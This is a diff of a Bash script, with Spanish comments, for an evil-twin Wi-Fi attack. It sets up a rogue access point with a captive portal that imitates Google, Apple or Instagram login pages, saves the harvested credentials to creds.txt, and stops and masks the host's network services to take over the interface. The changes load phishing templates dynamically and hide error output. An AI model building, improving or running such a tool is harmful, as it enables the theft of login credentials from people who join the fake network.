@@ -6,7 +6,7 @@ function ctrl_c(){
 	./src/reset.sh ap
 
 	if [ -n "$(/bin/cat ./pages/$pagina/datos.txt 2>&1)" ];then
-		echo $(/bin/cat ./pages/$pagina/datos.txt 2> /dev/null) > creds.txt
+		/bin/cat ./pages/$pagina/datos.txt 2> /dev/null > creds.txt
 		echo "" > ./pages/$pagina/datos.txt
 	fi
 	exit 0
@@ -49,14 +49,22 @@ function datos_ap(){
 		echo -ne "\nEspecifique la contraseña (8:63 chars): " && read -r pass
 	done
 
-	paginas=("google" "apple" "instagram")
-	echo -ne "\n====Plantillas Disponibles====\n\n0:${paginas[0]}\n1:${paginas[1]}\n2:${paginas[2]}\n"
+	paginas=()
+	for dir in pages/*/; do
+		[ -d "$dir" ] && paginas+=("$(basename "$dir")")
+	done
+
+	echo -ne "\n====Plantillas Disponibles====\n"
+	for i in "${!paginas[@]}"; do
+		echo -ne "$i: ${paginas[$i]}\n"
+	done
 
 	while [ -z "$indice_pagina" ] || [ "$indice_pagina" -ge "${#paginas[@]}" ] || [ "$indice_pagina" -lt 0 ]; do
 		echo -ne "\nPlantilla para el portal cautivo: " && read -r indice_pagina
 	done
 	pagina=${paginas[$indice_pagina]}
 }
+
 ##############################    Ataque    ##########################################
 
 function start_ap(){
@@ -65,10 +73,10 @@ function start_ap(){
 	sleep 1
 
 # -- setup --
-	systemctl -q stop wpa_supplicant NetworkManager
-	systemctl -q mask wpa_supplicant NetworkManager
-	systemctl -q stop systemd-resolved-monitor.socket systemd-resolved-varlink.socket systemd-resolved
-	systemctl -q mask systemd-resolved-monitor.socket systemd-resolved-varlink.socket systemd-resolved
+	systemctl -q stop wpa_supplicant NetworkManager 2> /dev/null
+	systemctl -q mask wpa_supplicant NetworkManager 2> /dev/null
+	systemctl -q stop systemd-resolved-monitor.socket systemd-resolved-varlink.socket systemd-resolved 2> /dev/null
+	systemctl -q mask systemd-resolved-monitor.socket systemd-resolved-varlink.socket systemd-resolved 2> /dev/null
 	sleep 1
 
 	pkill dnsmasq >/dev/null 2>&1
